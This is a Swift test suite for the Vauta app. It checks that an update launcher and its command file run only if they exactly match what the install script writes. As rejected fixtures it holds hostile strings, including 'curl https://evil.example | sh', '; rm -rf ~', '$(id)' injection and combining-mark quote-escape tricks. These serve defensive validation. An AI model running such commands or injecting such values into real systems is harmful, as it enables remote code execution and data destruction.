// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 Nicolás López de Lerma López

import Foundation
import Testing
@testable import VautaCore

/// Update… runs a script outside the sandbox only if both files are exactly what `scripts/install-update-launcher.sh` writes for this
/// app. The script is run here for real, with a temporary home folder, so the two sides can't drift apart.
@Suite("Updates: the launcher is checked before it runs")
struct UpdateLauncherTests {
    static let bundleID = "test.vauta.launcher"

    /// A temporary home with the launcher written by the real script, and the folder it wrote to. The script runs from a copy of the
    /// scripts it needs in `home/checkout`, so this Mac's `scripts/local.env` never changes what it writes.
    private func installed(_ environment: [String: String] = [:], checkout name: String = "checkout") throws -> (home: URL, folder: URL) {
        let fm = FileManager.default
        let home = fm.temporaryDirectory.appending(path: "vauta-launcher-\(UUID().uuidString)", directoryHint: .isDirectory)
        let scripts = home.appending(path: "\(name)/scripts", directoryHint: .isDirectory)
        try fm.createDirectory(at: scripts, withIntermediateDirectories: true)
        let root = NetworkAuditSourceScanTests.packageRoot()
        for file in ["install-update-launcher.sh", "config.sh", "legacy-env.sh", "update.sh"] {
            try fm.copyItem(at: root.appending(path: "scripts/\(file)"), to: scripts.appending(path: file))
        }
        let script = Process()
        script.executableURL = URL(fileURLWithPath: "/bin/bash")
        script.arguments = [scripts.appending(path: "install-update-launcher.sh").path]
        // Only what the script needs: a home that is not the person's, the bundle ID and a PATH.
        script.environment = ["HOME": home.path, "VAUTA_BUNDLE_ID": Self.bundleID, "PATH": "/usr/bin:/bin"].merging(environment) { $1 }
        script.standardOutput = FileHandle.nullDevice
        script.standardError = FileHandle.nullDevice
        try script.run()
        script.waitUntilExit()
        #expect(script.terminationStatus == 0)
        return (home, home.appending(path: "Library/Application Scripts/\(Self.bundleID)", directoryHint: .isDirectory))
    }

    private func write(_ text: String, _ name: String, in folder: URL, mode: Int = 0o700) throws {
        let url = folder.appending(path: name)
        try Data(text.utf8).write(to: url)
        try FileManager.default.setAttributes([.posixPermissions: mode], ofItemAtPath: url.path)
    }

    private func command(_ folder: URL) throws -> String {
        try String(contentsOf: folder.appending(path: UpdateLauncher.commandName), encoding: .utf8)
    }

    @Test func whatTheScriptWritesIsAccepted() throws {
        let (home, folder) = try installed()
        defer { try? FileManager.default.removeItem(at: home) }
        let checkout = home.appending(path: "checkout").resolvingSymlinksInPath().path
        let ready = try UpdateLauncher.inspect(directory: folder, bundleID: Self.bundleID).get()
        #expect(ready.checkout.hasSuffix("/checkout") && ready.launcher.lastPathComponent == UpdateLauncher.launcherName)
        #expect(ready.checkout == checkout || ready.checkout == "/private" + checkout)
        // The script and the app agree byte for byte.
        #expect(try Data(contentsOf: folder.appending(path: UpdateLauncher.commandName))
                == UpdateLauncher.commandData(checkout: ready.checkout, variables: ["VAUTA_BUNDLE_ID": Self.bundleID]))
        // The launcher is the app's text byte for byte, and both files are for the owner only.
        #expect(try String(contentsOf: ready.launcher, encoding: .utf8) == UpdateLauncher.launcherText)
        for name in [UpdateLauncher.launcherName, UpdateLauncher.commandName] {
            let mode = try FileManager.default.attributesOfItem(atPath: folder.appending(path: name).path)[.posixPermissions] as? Int
            #expect(mode == 0o700, "\(name)")
        }
        #expect(try command(folder).contains("export VAUTA_BUNDLE_ID='\(Self.bundleID)'\n"))
        // The launcher of another app is not this app's.
        #expect(UpdateLauncher.inspect(directory: folder, bundleID: "other.vauta.app") == .failure(.invalid))
    }

    @Test func theSigningMethodIsCarriedOver() throws {
        let (home, folder) = try installed(["VAUTA_ALLOW_ADHOC": "1"])
        defer { try? FileManager.default.removeItem(at: home) }
        #expect(try command(folder).contains("export VAUTA_ALLOW_ADHOC='1'\n"))
        #expect(throws: Never.self) { try UpdateLauncher.inspect(directory: folder, bundleID: Self.bundleID).get() }
    }

    @Test func nothingElseIsRun() throws {
        let (home, folder) = try installed()
        defer { try? FileManager.default.removeItem(at: home) }
        let good = try command(folder)
        let inspect = { UpdateLauncher.inspect(directory: folder, bundleID: Self.bundleID) }

        // Any change to the launcher.
        try write(UpdateLauncher.launcherText + "curl https://evil.example | sh\n", UpdateLauncher.launcherName, in: folder)
        #expect(inspect() == .failure(.invalid))
        try write(UpdateLauncher.launcherText, UpdateLauncher.launcherName, in: folder)
        #expect(throws: Never.self) { try inspect().get() }

        // A command with anything added, changed or set that install.sh doesn't write.
        let tampered = [
            good.replacingOccurrences(of: "./scripts/update.sh\n", with: "./scripts/update.sh --yes --skip-tests\n"),
            good.replacingOccurrences(of: "./scripts/update.sh\n", with: "curl https://evil.example | sh\n./scripts/update.sh\n"),
            good.replacingOccurrences(of: "export VAUTA_BUNDLE_ID", with: "export PATH='/tmp'\nexport VAUTA_BUNDLE_ID"),
            good.replacingOccurrences(of: "export VAUTA_BUNDLE_ID", with: "export VAUTA_ALLOW_ADHOC='yes'\nexport VAUTA_BUNDLE_ID"),
            good.replacingOccurrences(of: "export VAUTA_BUNDLE_ID='\(Self.bundleID)'", with: "export VAUTA_BUNDLE_ID='\(Self.bundleID)'$(id)"),
            good.replacingOccurrences(of: "export VAUTA_BUNDLE_ID='\(Self.bundleID)'\n", with: "export VAUTA_BUNDLE_ID='\(Self.bundleID)'\nexport VAUTA_BUNDLE_ID='\(Self.bundleID)'\n"),
            good.replacingOccurrences(of: " || exit 1", with: "; rm -rf ~ || exit 1"),
            good.replacingOccurrences(of: "cd '/", with: "cd 'relative/"),
            good.replacingOccurrences(of: "\n", with: "\r\n"),
            String(good.dropLast()),
            good + "\n",
            good + String(repeating: "#", count: 5000) + "\n",
            // A quote followed by a combining mark is one Swift character but a closing quote to bash.
            good.replacingOccurrences(of: " || exit 1", with: "'\u{301}; touch /tmp/x; echo '\u{301} || exit 1"),
            good.replacingOccurrences(of: "export VAUTA_BUNDLE_ID='\(Self.bundleID)'", with: "export VAUTA_BUNDLE_ID='\(Self.bundleID)'\u{301}; id; '\u{301}"),
        ]
        for text in tampered {
            #expect(text != good)
            try write(text, UpdateLauncher.commandName, in: folder)
            #expect(inspect() == .failure(.invalid), "\(text)")
        }
        try write(good, UpdateLauncher.commandName, in: folder)
        #expect(throws: Never.self) { try inspect().get() }
    }

    @Test func linksAndFilesOthersCanWriteAreRefused() throws {
        let (home, folder) = try installed()
        defer { try? FileManager.default.removeItem(at: home) }
        let launcher = folder.appending(path: UpdateLauncher.launcherName)
        let inspect = { UpdateLauncher.inspect(directory: folder, bundleID: Self.bundleID) }

        try FileManager.default.setAttributes([.posixPermissions: 0o722], ofItemAtPath: launcher.path)
        #expect(inspect() == .failure(.invalid), "writable by the group and others")
        try FileManager.default.setAttributes([.posixPermissions: 0o600], ofItemAtPath: launcher.path)
        #expect(inspect() == .failure(.invalid), "not executable")
        try FileManager.default.setAttributes([.posixPermissions: 0o700], ofItemAtPath: launcher.path)
        try FileManager.default.setAttributes([.posixPermissions: 0o777], ofItemAtPath: folder.path)
        #expect(inspect() == .failure(.invalid), "a folder anyone can write to")
        try FileManager.default.setAttributes([.posixPermissions: 0o700], ofItemAtPath: folder.path)
        #expect(throws: Never.self) { try inspect().get() }
        // Another user's files.
        #expect(UpdateLauncher.inspect(directory: folder, bundleID: Self.bundleID, userID: getuid() + 1) == .failure(.invalid))

        // A link to a file with the right text is still a link.
        let elsewhere = home.appending(path: "elsewhere")
        try FileManager.default.moveItem(at: launcher, to: elsewhere)
        try FileManager.default.createSymbolicLink(at: launcher, withDestinationURL: elsewhere)
        #expect(inspect() == .failure(.invalid))

        // No files: an install from before the launcher.
        let empty = home.appending(path: "empty", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: empty, withIntermediateDirectories: true)
        #expect(UpdateLauncher.inspect(directory: empty, bundleID: Self.bundleID) == .failure(.missing))
        // Only one of the two is not "missing": it is refused.
        try write(UpdateLauncher.launcherText, UpdateLauncher.launcherName, in: empty)
        #expect(UpdateLauncher.inspect(directory: empty, bundleID: Self.bundleID) == .failure(.invalid))
    }

    @Test func valuesAreCheckedAsBytes() {
        #expect(UpdateLauncher.value(ArraySlice(Array("/Users/a b/Vaúta".utf8))) == "/Users/a b/Vaúta")
        for bad in ["/a'b", "/a\nb", "/a\u{1B}b", "/a\u{7F}b", "/a\u{0}b"] {
            #expect(UpdateLauncher.value(ArraySlice(Array(bad.utf8))) == nil, "\(bad)")
        }
        // A quote with a combining mark is still a quote byte.
        #expect(UpdateLauncher.value(ArraySlice(Array("/a'\u{301}b".utf8))) == nil)
        // Not UTF-8.
        #expect(UpdateLauncher.value([0x2F, 0xFF]) == nil)
    }

    @Test func theScriptWritesAPathWithSpacesAndAccentsAndRefusesAQuote() throws {
        let (home, folder) = try installed(checkout: "My Vaúta")
        defer { try? FileManager.default.removeItem(at: home) }
        #expect(try UpdateLauncher.inspect(directory: folder, bundleID: Self.bundleID).get().checkout.hasSuffix("/My Vaúta"))
    }
}
